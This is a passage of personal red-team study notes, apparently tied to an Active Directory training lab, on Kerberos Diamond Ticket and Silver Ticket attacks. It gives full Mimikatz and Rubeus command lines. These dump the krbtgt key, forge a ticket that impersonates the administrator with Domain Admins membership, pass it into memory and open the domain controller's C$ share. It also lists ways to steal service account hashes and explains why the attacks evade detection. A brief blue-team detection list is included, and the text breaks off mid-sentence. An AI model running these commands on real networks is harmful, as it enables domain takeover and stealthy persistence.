+<div class="line-block">🎫 <strong>TGT Status</strong> | Modified copy of a real TGT (not a forged one) |</div>
+<div class="line-block">🧪 <strong>Tool</strong> | Uses <strong>Rubeus.exe</strong> with <code>/diamond</code> option |</div>
+<hr />
+<h3 id="why-is-it-called-diamond-ticket">🔍 Why is it called “Diamond Ticket”?</h3>
+<ul>
+<li><p>It’s <strong>sharper and stealthier</strong> than Golden Ticket.</p></li>
+<li><p>It’s a <strong>modified legit TGT</strong>, not a fabricated one.</p></li>
+<li><p>It appears <strong>100% legitimate to the DC</strong> since it’s based on a valid ticket.</p></li>
+<li><p>Detection is very difficult since the ticket times, structure, and signatures are correct.</p></li>
+</ul>
+<hr />
+<h3 id="persistence-1">🔹 Persistence</h3>
+<ul>
+<li><p>Just like a Golden Ticket, the persistence lifetime of a Diamond Ticket <strong>depends on the <code>krbtgt</code> account password/keys</strong>.</p></li>
+<li><p>If the <code>krbtgt</code> key is rotated twice, both Golden and Diamond Tickets become invalid.</p></li>
+</ul>
+<h3 id="why-its-stealthier-than-golden-ticket">Why It’s Stealthier Than Golden Ticket</h3>
+<div class="line-block">Factor | Golden Ticket | Diamond Ticket |</div>
+<div class="line-block">— | — | — |</div>
+<div class="line-block"><strong>AS-REQ</strong> | ❌ Forged from scratch (suspicious) | ✅ Legitimate (normal logon) |</div>
+<div class="line-block"><strong>Log Entry 1</strong> | Suspicious: User never logged in but has TGT | Normal: User legitimately requested TGT |</div>
+<div class="line-block"><strong>Temporal Accuracy</strong> | ⚠️ Manually calculated (errors possible) | ✅ DC timestamps (always accurate) |</div>
+<div class="line-block"><strong>PAC Structure</strong> | ⚠️ Forged PAC (structure might have errors) | ✅ Real PAC modified (structure perfect) |</div>
+<div class="line-block"><strong>Session Key</strong> | Forged | Legitimate from DC |</div>
+<div class="line-block"><strong>Detection Difficulty</strong> | Easier to detect TGT without proper auth | Harder—looks like normal login |</div>
+<p><strong>✅ Diamond is stealthier because:</strong></p>
+<ul>
+<li><p>Legitimate initial TGT request logs normally</p></li>
+<li><p>No suspicious “user requested TGT with PA-PAC-REQUEST=false”</p></li>
+<li><p>Ticket times are always correct (no calculation errors)</p></li>
+<li><p>Event logs show normal user authentication</p></li>
+</ul>
+<h3 id="diagram-explanation">Diagram Explanation</h3>
+<h4 id="rubeus-command-structure">Rubeus Command Structure</h4>
+<pre class="python"><code>
+rubeus.exe diamond /tgtdeleg /ticketuser:DOMAIN\Username /ticketuserid:1106 
+
+  /groups:512 /krbkey:KRBTGT_KEY_HEX /outfile:ticket.kirbi
+</code></pre>
+<h4 id="core-parameters-explained">Core Parameters Explained</h4>
+<div class="line-block">Parameter | Purpose | Component Role |</div>
+<div class="line-block">— | — | — |</div>
+<div class="line-block"><code>diamond</code> | Selects the attack mode | Routing to Diamond ticket logic |</div>
+<div class="line-block"><code>/tgtdeleg</code> | Request TGT via delegation | Legitimate TGT retrieval module |</div>
+<div class="line-block"><code>/ticketuser</code> | Target user identity to forge | User spoofing component |</div>
+<div class="line-block"><code>/ticketuserid</code> | RID of forged user | SID generator |</div>
+<div class="line-block"><code>/groups</code> | Forged group memberships | PAC privilege escalation |</div>
+<div class="line-block"><code>/krbkey</code> | KRBTGT master key (AES256) | Cryptographic signing engine |</div>
+<div class="line-block"><code>/outfile</code> | Save forged ticket to disk | Serialization module |</div>
+<h4 id="internal-components-architecture">Internal Components Architecture</h4>
+<pre class="python"><code>
+┌─────────────────────────────────────────────────────┐
+
+│           RUBEUS DIAMOND TICKET ENGINE               │
+
+└─────────────────────────────────────────────────────┘
+
+                          │
+
+        ┌─────────────────┼─────────────────┐
+
+        │                 │                 │
+
+    ┌───▼────┐       ┌───▼────┐       ┌───▼────┐
+
+    │ TGT    │       │ TICKET │       │ PAC    │
+
+    │RETRIEVAL       │MODIFIER        │SIGNER  │
+
+    └────────┘       └────────┘       └────────┘
+
+        │                 │                 │
+
+        │                 │                 │
+
+    1️⃣ LEGITIMATE    2️⃣ MODIFY      3️⃣ RE-SIGN
+
+      AS-REQ/TGT      PLAINTEXT      WITH KRBTGT
+
+        │                 │                 │
+
+        └─────────────────┼─────────────────┘
+
+                          │
+
+                     ┌────▼─────┐
+
+                     │ ENCRYPT   │
+
+                     │ &amp; EXPORT  │
+
+                     └───────────┘
+
+                          │
+
+                     ticket.kirbi
+</code></pre>
+<hr />
+<h3 id="component-1-tgt-delegation-retrieval-tgtdeleg">Component 1: TGT Delegation Retrieval (<code>/tgtdeleg</code>)</h3>
+<p><strong>What It Does</strong></p>
+<p>Requests a legitimate Ticket-Granting Ticket from the Domain Controller using the current user’s credentials.</p>
+<p><strong>Internal Operations</strong></p>
+<pre class="python"><code>
+Step 1: AS-REQ Construction
+
+├─ client_name = current_user
+
+├─ realm = DOMAIN
+
+├─ nonce = random_32bit
+
+└─ cname = client principal name
+
+Step 2: Cryptographic Binding
+
+├─ Derive key from user password (PBKDF2)
+
+├─ Create PA-ENC-TIMESTAMP
+
+│  └─ Timestamp encrypted with user&#39;s key
+
+└─ Sign request with user&#39;s credentials
+
+Step 3: DC Response (AS-REP)
+
+├─ Receive encrypted TGT
+
+├─ Decrypt using user&#39;s password-derived key
+
+└─ Extract plaintext TGT components
+</code></pre>
+<h4 id="what-rubeus-extracts-from-tgt">What Rubeus Extracts from TGT</h4>
+<pre class="python"><code>
+// From the encrypted TGT blob
+
+struct TicketData {
+
+    int flags;                    // Renewable, forwarded, etc.
+
+    string realm;                 // DOMAIN.COM
+
+    string server_name;           // krbtgt/DOMAIN.COM
+
+    Timestamp auth_time;          // When TGT was created
+
+    Timestamp start_time;         // Valid from
+
+    Timestamp end_time;           // Expires (typically 10 hours)
+
+    Timestamp renew_till;         // Can renew until
+
+    Ticket ticket;                // Encrypted AS-REP part
+
+    EncryptedData enc_part;       // Encrypted TGT contents
+
+}
+</code></pre>
+<h3 id="component-2-ticket-modifier">Component 2: Ticket Modifier</h3>
+<p><strong>What It Modifies</strong></p>
+<pre class="python"><code>
+┌──────────────────────────────────────┐
+
+│   DECRYPT TGT (using KRBTGT key)     │
+
+└──────────────────────────────────────┘
+
+                  │
+
+    ┌─────────────┼─────────────┐
+
+    │             │             │
+
+    ▼             ▼             ▼
+
+ PRINCIPAL    GROUPS        TIMESTAMPS
+
+  NAMES     (RIDs/SIDs)
+
+    │             │             │
+
+With /ticketuser:DOMAIN\NewUser
+
+├─ Replace cname (client name)
+
+├─ Replace crealm (client realm)
+
+└─ Update name-type indicator
+
+With /groups:512
+
+├─ 512 = Domain Admins RID
+
+├─ Insert SID: S-1-5-21-DOMAIN-512
+
+└─ Update PAC_GROUPS_AND_RESOURCE_GROUPS
+
+With /krbkey:HEX_KEY
+
+├─ Use for decryption operations
+
+└─ Use for re-signing operations
+</code></pre>
+<p><strong>Encrypted Part Decryption</strong></p>
+<pre class="python"><code>
+Encrypted TGT (from DC) 
+
+    │
+
+    ├─ Algorithm: AES256-CTS (RFC 3962)
+
+    ├─ Key: KRBTGT master key (AES256 derived from password)
+
+    └─ IV: First 16 bytes of encrypted blob
+
+    │
+
+    ▼
+
+EncKDCRepPart (plaintext)
+
+├─ Key (session key for this TGT)
+
+├─ Last-req
+
+├─ Nonce (should match request nonce)
+
+├─ Flags
+
+└─ **PAC (Privilege Attribute Certificate)**
+</code></pre>
+<h3 id="component-3-pac-modifier-signer">Component 3: PAC Modifier &amp; Signer</h3>
+<p>This is the most critical component for the attack.</p>
+<p><strong>PAC Structure</strong></p>
+<pre class="python"><code>
+PAC Buffer (within TGT)
+
+│
+
+├─ PAC_LOGON_INFO (0)
+
+│  ├─ User Name
+
+│  ├─ Domain Name
+
+│  ├─ User RID
+
+│  ├─ Primary Group RID
+
+│  ├─ Group Count
+
+│  └─ Group RIDs ◄─── MODIFIED HERE
+
+│
+
+├─ PAC_CREDENTIAL_INFO (1)
+
+│  └─ Encrypted with session key (not modified)
+
+│
+
+├─ PAC_SERVER_CHECKSUM (6) ◄─── RE-SIGNED HERE
+
+│  ├─ Algorithm: HmacSHA1 or HmacSHA256
+
+│  ├─ Signed over: PAC_LOGON_INFO + other buffers
+
+│  └─ Key: KRBTGT key
+
+│
+
+└─ PAC_PRIVSVR_CHECKSUM (7) ◄─── RE-SIGNED HERE
+
+   ├─ Algorithm: HmacSHA1 or HmacSHA256
+
+   ├─ Signed over: All other buffers
+
+   └─ Key: KRBTGT key
+</code></pre>
+<p><strong>Modification Workflow in Rubeus</strong></p>
+<pre class="python"><code>
+1. DESERIALIZE (unmarshal ASN.1)
+
+   ├─ Parse DER-encoded TGT structure
+
+   └─ Convert to C# objects
+
+2. DECRYPT enc_part (using KRBTGT key)
+
+   ├─ Extract session key
+
+   ├─ Extract PAC buffer array
+
+   └─ Locate LogonInfo buffer
+
+3. MODIFY LOGON_INFO
+
+   ├─ Update user_name = /ticketuser value
+
+   ├─ Update user_rid = /ticketuserid value
+
+   ├─ Update GroupIds array
+
+   │  └─ For each RID in /groups:
+
+   │     ├─ Create SID: S-1-5-21-DOMAIN-RID
+
+   │     └─ Append to GroupIds
+
+   └─ Recalculate buffer offsets
+
+4. RE-CALCULATE CHECKSUMS
+
+   ├─ Server Checksum:
+
+   │  └─ HMAC-SHA256(KRBTGT_key, PAC_LogonInfo)
+
+   ├─ KDC Checksum:
+
+   │  └─ HMAC-SHA256(KRBTGT_key, all_other_buffers)
+
+   └─ Update checksum buffers in PAC
+
+5. RE-ENCRYPT enc_part
+
+   ├─ Encrypt modified EncKDCRepPart
+
+   ├─ Algorithm: AES256-CTS
+
+   └─ Key: KRBTGT key (again)
+</code></pre>
+<hr />
+<h3 id="component-4-ticket-re-encryption-serialization">Component 4: Ticket Re-Encryption &amp; Serialization</h3>
+<p><strong>Final Encryption</strong></p>
+<pre class="python"><code>
+Modified EncKDCRepPart (plaintext with new PAC)
+
+    │
+
+    ├─ Cipher: AES256-CTS
+
+    ├─ Key: KRBTGT key
+
+    └─ Generate random IV
+
+    │
+
+    ▼
+
+Encrypted Blob
+
+    │
+
+    ├─ Concatenate: IV + Ciphertext
+
+    └─ Store in Ticket structure
+
+Ticket {
+
+    tkt_vno = 5 (Kerberos version)
+
+    realm = DOMAIN.COM
+
+    sname = krbtgt/DOMAIN.COM
+
+    enc_part {
+
+        etype = 18 (AES256-CTS)
+
+        cipher_text = [IV + encrypted_data]
+
+    }
+
+}
+</code></pre>
+<h4 id="kirbi-format-export">Kirbi Format Export</h4>
+<pre class="python"><code>
+Rubeus exports as .kirbi (Rubeus native format)
+
+│
+
+├─ File Header: &quot;Kirbi&quot; magic bytes
+
+├─ TGT Structure: Full Ticket + optional Service Ticket
+
+└─ Base64 encoding (optional, depending on flag)
+
+Alternative exports:
+
+├─ /outfile:ticket.kirbi     → Binary kirbi format
+
+├─ /outfile:ticket.b64       → Base64-encoded kirbi
+
+└─ /copy                     → Load directly to memory
+</code></pre>
+<h3 id="key-cryptographic-operations">Key Cryptographic Operations</h3>
+<p><strong>1. Key Derivation (for understanding)</strong></p>
+<pre class="python"><code>
+KRBTGT_KEY (AES256) derivation:
+
+┌─────────────────────────────────────────┐
+
+│ Pbkdf2_HMAC_SHA1(password, salt, iterations)
+
+├─ password = KRBTGT account password
+
+├─ salt = DOMAIN.COMkrbtgt (realm + SPN)
+
+├─ iterations = 4096
+
+└─ output = 32 bytes (AES256 key)
+
+└─────────────────────────────────────────┘
+</code></pre>
+<p><strong>2. HMAC Checksum (critical for PAC)</strong></p>
+<pre class="python"><code>
+Server Checksum (protects PAC_LOGON_INFO):
+
+─────────────────────────────────────────
+
+checksum = HMAC-SHA256(
+
+    key = KRBTGT_KEY,
+
+    message = PAC_LOGON_INFO buffer
+
+)
+
+output = 32 bytes (SHA256 produces 32)
+
+KDC Checksum (protects everything else):
+
+─────────────────────────────────────────
+
+checksum = HMAC-SHA256(
+
+    key = KRBTGT_KEY,
+
+    message = PAC_SERVER_CHECKSUM || PAC_CREDENTIAL_INFO || ...
+
+)
+</code></pre>
+<h4 id="how-rubeus-handles-encryptiondecryption">How Rubeus Handles Encryption/Decryption</h4>
+<p>Rubeus uses <strong>Bouncy Castle cryptography library</strong> internally:</p>
+<pre class="python"><code>
+// Simplified conceptual flow
+
+// 1. AES256-CTS Decryption
+
+var cipher = new CtsBlockCipher(new AesEngine());
+
+cipher.Init(false, new KeyParameter(krbtgtKey));  // false = decrypt mode
+
+byte[] plaintext = new byte[ciphertext.Length];
+
+cipher.ProcessBytes(ciphertext, 0, ciphertext.Length, plaintext, 0);
+
+// 2. HMAC-SHA256 Signing
+
+var hmac = new HMac(new Sha256Digest());
+
+hmac.Init(new KeyParameter(krbtgtKey));
+
+hmac.BlockUpdate(bufferToSign, 0, bufferToSign.Length);
+
+byte[] checksum = new byte[hmac.GetMacSize()];
+
+hmac.DoFinal(checksum, 0);
+</code></pre>
+<h4 id="data-flow-diagram">Data Flow Diagram</h4>
+<pre class="python"><code>
+┌──────────────────────────┐
+
+│ DC (Domain Controller)   │
+
+│                          │
+
+│ Receives: AS-REQ         │◄──── Current user credentials
+
+│ Sends: AS-REP with TGT   │
+
+└──────────────┬───────────┘
+
+               │
+
+               │ Legitimate TGT
+
+               │ (KRBTGT-encrypted)
+
+               ▼
+
+┌──────────────────────────────────────┐
+
+│       RUBEUS DIAMOND ENGINE           │
+
+│                                       │
+
+│ 1. Decrypt with /krbkey             │
+
+│    └─ Gets plaintext TGT             │
+
+│                                       │
+
+│ 2. Extract PAC from TGT              │
+
+│    └─ Gets logon info + checksums    │
+
+│                                       │
+
+│ 3. Modify:                           │
+
+│    ├─ User RID → /ticketuserid       │
+
+│    ├─ User name → /ticketuser        │
+
+│    └─ Groups → /groups parameters    │
+
+│                                       │
+
+│ 4. Re-sign PAC:                      │
+
+│    ├─ Server checksum (HMAC-SHA256)  │
+
+│    └─ KDC checksum (HMAC-SHA256)     │
+
+│                                       │
+
+│ 5. Re-encrypt with KRBTGT key        │
+
+│                                       │
+
+│ 6. Export to /outfile:ticket.kirbi   │
+
+└──────────────┬───────────────────────┘
+
+               │
+
+               │ Forged TGT
+
+               │ (appears DC-signed)
+
+               ▼
+
+┌──────────────────────────┐
+
+│  Use with Kerberos tools │
+
+│  (Pass-the-Ticket, etc.) │
+
+└──────────────────────────┘
+</code></pre>
+<h3 id="windows-example">Windows Example</h3>
+<h3 id="step-by-step-diamond-ticket-attack">🪜 Step-by-Step: Diamond Ticket Attack</h3>
+<hr />
+<p><strong>🧩 Step 1: Dump the krbtgt AES key</strong></p>
+<p>If you have <strong>DA privileges</strong> or <strong>DCSync</strong>, use Mimikatz:</p>
+<pre class="powershell"><code>
+lsadump::lsa /inject
+</code></pre>
+<p>Look for:</p>
+<pre><code>
+AES256_hmac       : &lt;long krbtgt AES key&gt;
+</code></pre>
+<hr />
+<p><strong>🧩 Step 2: Obtain a valid TGT</strong></p>
+<p>Two ways to do it:</p>
+<p><strong>Option A: Via <code>/tgtdeleg</code> (no password needed)</strong></p>
+<p>If you’re running code as a domain user and delegation is enabled:</p>
+<pre class="powershell"><code>
+Rubeus.exe tgtdeleg
+</code></pre>
+<p>This extracts a valid TGT from memory of the current user session.</p>
+<p><strong>Option B: With username &amp; password</strong></p>
+<p>Use credentials of a domain user to request a TGT:</p>
+<pre class="powershell"><code>
+Rubeus.exe asktgt /user:studentx /password:StudentxPassword /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /enctype:aes /ptt
+</code></pre>
+<hr />
+<p><strong>🧩 Step 3: Use Rubeus to modify the TGT → Diamond Ticket</strong></p>
+<p>Two main ways:</p>
+<p><strong>1. Using credentials of a domain user</strong></p>
+<pre class="bash"><code>
+Rubeus.exe diamond
+
+/krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
+
+/user:studentx
+
+/password:StudentxPassword
+
+/enctype:aes
+
+/ticketuser:administrator
+
+/domain:dollarcorp.moneycorp.local
+
+/dc:dcorp-dc.dollarcorp.moneycorp.local
+
+/ticketuserid:500
+
+/groups:512
+
+/createnetonly:C:\Windows\System32\cmd.exe
+
+/show
+
+/ptt
+</code></pre>
+<pre class="powershell"><code>
+same command in one line:
+
+C:\AD\Tools\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:studentx /password:StudentxPassword /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+</code></pre>
+<ul>
+<li><p><code>/krbkey</code> → krbtgt AES key</p></li>
+<li><p><code>/user</code> + <code>/password</code> → valid domain user credentials</p></li>
+<li><p><code>/ticketuser:administrator</code> → impersonate admin</p></li>
+<li><p><code>/groups:512</code> → add Domain Admins group</p></li>
+<li><p><code>/createnetonly</code> → spawn a new process (cmd) with this ticket</p></li>
+<li><p><code>/ptt</code> → pass-the-ticket (inject into current session)</p></li>
+</ul>
+<hr />
+<p><strong>2. Using delegated TGT (<code>/tgtdeleg</code>)</strong></p>
+<pre class="bash"><code>
+Rubeus.exe diamond
+
+/krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
+
+/tgtdeleg
+
+/enctype:aes
+
+/ticketuser:administrator
+
+/domain:dollarcorp.moneycorp.local
+
+/dc:dcorp-dc.dollarcorp.moneycorp.local
+
+/ticketuserid:500
+
+/groups:512
+
+/createnetonly:C:\Windows\System32\cmd.exe
+
+/show
+
+/ptt
+</code></pre>
+<p>same command in one line:</p>
+<pre class="powershell"><code>
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+</code></pre>
+<p><strong>Explanation:</strong></p>
+<div class="line-block">Parameter | Description |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block"><code>/krbkey</code> | krbtgt AES256 or RC4 key |</div>
+<div class="line-block"><code>/tgtdeleg</code> | lets Rubeus extract a valid TGT from memory (no creds needed if you already have user context). |</div>
+<div class="line-block"><code>/ticketuser</code> | User you want to impersonate (e.g., <code>administrator</code>) |</div>
+<div class="line-block"><code>/ticketuserid</code> | RID of user (<code>500</code> = built-in Administrator) |</div>
+<div class="line-block"><code>/groups</code> | SID group list (512 = Domain Admins) |</div>
+<div class="line-block"><code>/createnetonly</code> | Spawn a new process with only this ticket |</div>
+<div class="line-block"><code>/ptt</code> | Pass-the-ticket (injects into memory) |</div>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p><strong>🧩 Step 4: Use the Diamond Ticket to Access Services</strong></p>
+<p>After <code>/ptt</code>, your ticket is injected into memory.</p>
+<p>Now you can do:</p>
+<pre class="powershell"><code>
+dir \\dcorp-dc.dollarcorp.moneycorp.local\C$
+</code></pre>
+<p>Or open a privileged session:</p>
+<pre class="bash"><code>
+C:\Windows\System32\cmd.exe
+</code></pre>
+<p>You’ll have <strong>DA privileges</strong> under the impersonated user.</p>
+<h2 id="sliver-ticket-attack">Sliver Ticket Attack</h2>
+<h3 id="understanding-the-core-concept-2">Understanding The Core Concept</h3>
+<h2 id="what-is-a-silver-ticket-attack">🚀 What is a Silver Ticket Attack?</h2>
+<p>A Silver Ticket attack is a Kerberos-based attack where an attacker forges a service ticket (TGS) to access a specific service (like SQL, HTTP, CIFS, etc.) on behalf of a legitimate user — without needing to interact with the domain controller after forging the ticket.</p>
+<p>Unlike Golden Tickets, which give access to any service in the domain, Silver Tickets are scoped to a single SPN (service principal name) like <code>CIFS/server</code>, <code>HTTP/server</code>, etc.</p>
+<p>👉 Golden ticket = forge TGT (Ticket Granting Ticket) → access to everything</p>
+<p>👉 Silver ticket = forge TGS (service ticket) → access to specific service</p>
+<blockquote>
+<p>Because the ticket is presented directly to the service (not to the KDC), Domain Controllers never see the request → fewer logs and much stealthier.</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<h3 id="why-silver-ticket-attack-is-more-stealthier-than-golden-ticket-attack">⚙️Why Silver Ticket Attack is more Stealthier than Golden Ticket Attack:</h3>
+<p>Silver Ticket attacks are considered more stealthy than Golden Ticket attacks because Golden Tickets rely on the <code>krbtgt</code> account (which resides on the KDC and is heavily monitored by security solutions like Microsoft Defender for Identity -MDI), whereas Silver Tickets are forged using service account credentials and only interact directly with the target service, making them less likely to trigger high-fidelity alerts.</p>
+<p>You can forge a Silver Ticket for DC service accounts (like <code>CIFS/DC01</code>, <code>LDAP/DC01</code>, etc.), and it usually remains undetected by Microsoft Defender for Identity (MDI) because there’s no KDC involvement. That’s why Silver Tickets are considered more stealthy than Golden Tickets, even when targeting the DC itself.</p>
+<h3 id="how-kerberos-works-simplified-flow">⚡ How Kerberos works (simplified flow)</h3>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>1️⃣ User authenticates and gets a TGT (Ticket Granting Ticket) from the KDC/Domain Controller (encrypted with KRBTGT account key).</p>
+<p>2️⃣ User presents TGT to request a TGS (Service Ticket) from the KDC for the service (like CIFS/SQL).</p>
+<p>3️⃣ User presents TGS to the service to access it.</p>
+<hr />
+<h3 id="requirements-before-exploitation">🧩 Requirements Before Exploitation</h3>
+<ol type="1">
+<li><p>✅ Domain SID (can be retrieved from any domain account using <code>whoami /user</code>)</p></li>
+<li><p>✅ Hostname and SPN of target service (e.g., MSSQLSvc/db1.dollarcorp.moneycorp.local)</p></li>
+<li><p>✅ NTLM hash of the target service account (<code>db1$</code>)</p></li>
+<li><p>✅ Tool to forge and inject ticket (e.g., Rubeus, Mimikatz)</p></li>
+</ol>
+<h3 id="how-the-silver-ticket-attack-happens">⚠ How the Silver Ticket attack happens</h3>
+<h3 id="key-idea">📌 Key idea</h3>
+<p>If an attacker compromises the password hash of a service account (e.g. the account under which SQL runs or HTTP runs), they can forge a valid service ticket (TGS) for that service.</p>
+<p>👉 The TGS is encrypted/signed using the service account’s password hash (because that’s what the service can verify).</p>
+<h3 id="common-ways-attackers-obtain-the-service-key">⚠ Common ways attackers obtain the service key</h3>
+<p><strong>Method 1 — LSASS dump</strong></p>
+<p>Compromise a machine running the service.</p>
+<p>Then dump LSASS.</p>
+<p>Result:</p>
+<p>🔑 Service account hash appears in memory.</p>
+<p>Example:</p>
+<ul>
+<li><p>SQL running as <code>sqlsvc</code></p></li>
+<li><p>IIS running as <code>websvc</code></p></li>
+<li><p>Computer account <code>SERVER$</code></p></li>
+</ul>
+<hr />
+<p><strong>Method 2 — DCSync</strong></p>
+<p>If attacker has replication rights:</p>
+<p>🧠 Domain Controller</p>
+<p>➡️ returns password hashes for <strong>any account</strong></p>
+<p>So attacker can request:</p>
+<p>🔑 <code>DB1$</code></p>
+<p>🔑 <code>SQLSVC</code></p>
+<p>🔑 <code>DC01$</code></p>
+<p>Then forge tickets.</p>
+<hr />
+<p><strong>Method 3 — Kerberoasting (what you suggested)</strong></p>
+<p>Yes — <strong>this works too</strong>.</p>
+<p>Normal user can request:</p>
+<p>🎟️ <strong>TGS for a service SPN</strong></p>
+<p>Example:</p>
+<p>User requests:</p>
+<p>🎫 TGS for <code>MSSQLSvc/db1</code></p>
+<p>KDC sends ticket encrypted with:</p>
+<p>🔑 <strong>SQL service account key</strong></p>
+<p>Attacker then:</p>
+<p>🧨 extracts encrypted blob</p>
+<p>🧨 cracks it offline</p>
+<p>If password is weak:</p>
+<p>🔓 attacker gets service account hash</p>
+<p>Then attacker can forge Silver Ticket.</p>
+<p>So your idea is <strong>100% valid</strong>.</p>
+<h3 id="steps">📌 Steps</h3>
+<p>✅ 1. Attacker compromises service account credentials (NTLM hash / password)</p>
+<ul>
+<li>For example: <code>HTTP/srv-web.research.local</code> or <code>MSSQLSvc/sql.research.local</code></li>
+</ul>
+<p>✅ 2. Attacker uses Mimikatz or similar tool to forge a TGS for that service</p>
+<ul>
+<li><p>They craft a ticket claiming any user identity (even admin)</p></li>
+<li><p>The ticket is encrypted with the service account’s NTLM hash so it looks valid to the service</p></li>
+</ul>
+<p>✅ 3. Attacker presents this forged ticket directly to the target service</p>
+<ul>
+<li>Since the service can decrypt and validate the ticket (it trusts its own key), access is granted!</li>
+</ul>
+<p>✅ 4. No communication with Domain Controller is required during usage</p>
+<ul>
+<li>So detection is harder because no logon event is generated at the DC.</li>
+</ul>
+<h3 id="commonly-target-services-in-silver-ticket">Commonly Target Services in Silver Ticket:</h3>
+<div class="line-block"><strong>SPN</strong> | <strong>Service Type</strong> | <strong>What It Enables (via Silver Ticket)</strong> |</div>
+<div class="line-block">— | — | — |</div>
+<div class="line-block"><strong>CIFS</strong> | SMB (File System) | Access to <strong>network file shares</strong>, remote file copy (e.g., via <code>net use</code>, <code>dir \\host\share</code>) |</div>
+<div class="line-block"><strong>HOST</strong> | Generic Windows Service SPN | Grants access to <strong>WinRM</strong>, <strong>Remote Desktop</strong>, <strong>Task Scheduler</strong>, <strong>Service Control Manager</strong> (SCM), etc. |</div>
+<div class="line-block"><strong>RPCSS</strong> | Remote Procedure Call Service | Enables <strong>WMI access</strong>, <strong>remote DCOM</strong>, and some <strong>ActiveX</strong> interactions |</div>
+<div class="line-block"><strong>HTTP</strong> | Web-based services | Used by <strong>PowerShell Remoting</strong>, <strong>WinRM</strong>, OWA, IIS apps — anything over HTTP/HTTPS |</div>
+<blockquote>
+<p>💡 Bonus Tip: Many SPNs are tied to the computer account (hostname$) — so if you dump a machine’s hash, you can often target all these services on that host with forged Silver Tickets.</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<p><em>Most service accounts are AD user accounts with SPNs registered, which differentiates them from normal user accounts.</em></p>
+<h3 id="one-subtle-thing-many-people-miss">⚡ One subtle thing many people miss</h3>
+<p>Silver Tickets can <strong>impersonate users that don’t even exist</strong>.</p>
+<p>Example:</p>
+<p>👤 <code>fakeadmin</code></p>
+<p>If PAC says:</p>
+<p>👥 Domain Admin</p>
+<p>Service will still accept it.</p>
+<p>Because it trusts the PAC inside the ticket.</p>
+<h3 id="persistance-peroid-of-golden-ticket">🔍 Persistance Peroid of Golden Ticket</h3>
+<h3 id="silver-ticket-persistence">Silver Ticket Persistence</h3>
+<ul>
+<li>A <strong>Silver Ticket</strong> is forged using the <strong>NTLM hash of a service account or computer account</strong> (not <code>krbtgt</code>).</li>
+</ul>
+<h4 id="persistence-2">Persistence:</h4>
+<ul>
+<li><p>As long as the <strong>service account’s password</strong> (or machine account password) <strong>remains unchanged</strong>.</p></li>
+<li><p><strong>Service accounts:</strong> Many organizations set them with <strong>“Password never expires”</strong>, so a Silver Ticket could last indefinitely.</p></li>
+<li><p><strong>Machine accounts:</strong> By default, Windows <strong>rotates machine account passwords every 30 days</strong>, so Silver Ticket persistence for computer accounts is typically ~30 days. But for user-based service accounts (often set to “never expire”), persistence can be much longer.</p></li>
+</ul>
+<h3 id="limitations">🚫 Limitations</h3>
+<ul>
+<li><p>Works only for <strong>that service on that system</strong> (scoped).</p></li>
+<li><p>If the service <strong>enforces PAC validation</strong> (with KDC), the forged ticket will fail.</p></li>
+<li><p>You need the <strong>exact SPN</strong> and <strong>hash</strong> of the service account.</p></li>
+<li><p>If the service logs user access or performs detailed auditing, the fake identity might be suspicious.</p></li>
+</ul>
+<h3 id="detection-and-defense-tips-for-blue-teams">🛡️ Detection and Defense Tips (for Blue Teams)</h3>
+<ul>
+<li><p><strong>Event ID 4624</strong> on the target machine with unexpected usernames.</p></li>
+<li><p>PAC validation failures (Event ID 4769 with KDC_ERR_PADATA_TYPE_NOSUPP).</p></li>
+<li><p>Monitor for <strong>tickets used without a matching request to the KDC</strong>.</p></li>
+<li><p>Service logs showing high-privilege users accessing them in unusual ways.</p></li>
+</ul>
+<h3 id="how-the-attack-works---logic">How the attack works ?? - Logic</h3>
+<h3 id="how-it-works-internally">⚙️ How it Works Internally</h3>
+<h3 id="valid-service-ticket-tgs"><strong>1. Valid Service Ticket (TGS)</strong></h3>
+<p>A <strong>Service Ticket (TGS)</strong> is normally issued by the <strong>KDC (Domain Controller)</strong> for a specific service that the user wants to access.</p>
+<p><strong>Normal Kerberos Flow</strong></p>
+<p>👤 User → Requests access to a service (Example: SMB on DC01)</p>
+<p>👤 User → asks <strong>KDC</strong> for a service ticket for that service</p>
+<p>🧠 KDC verifies the user’s <strong>TGT</strong> and then creates a <strong>TGS</strong></p>
+<p>The generated ticket contains:</p>
+<p><strong>📦 Ticket Content</strong></p>
+<p>• User identity</p>
+<p>• User SID</p>
+<p>• Group memberships</p>
+<p>• Privileges</p>
+<p>• Logon metadata</p>
+<p>This authorization block is called:</p>
+<p>📜 <strong>PAC (Privilege Attribute Certificate)</strong></p>
+<p>After creating the ticket:</p>
+<p>🧠 KDC</p>
+<p>🔐 Encrypts the ticket using the <strong>service account key</strong></p>
+<p>Example</p>
+<p>Service → <strong>CIFS/DC01</strong></p>
+<p>Service account → <strong>DC01$</strong></p>
+<p>So the ticket is encrypted using:</p>
+<p>🔑 <strong>DC01$ password hash</strong></p>
+<p>The ticket is then returned to the user.</p>
+<p>👤 User</p>
+<p>➡️ Presents ticket directly to the service</p>
+<p>🖥️ Service decrypts it and grants access.</p>
+<hr />
+<p><strong>Silver Ticket Concept</strong></p>
+<p>Instead of requesting a ticket from the KDC:</p>
+<p>⚠️ Attacker <strong>creates the ticket offline</strong></p>
+<p>Because the attacker already has:</p>
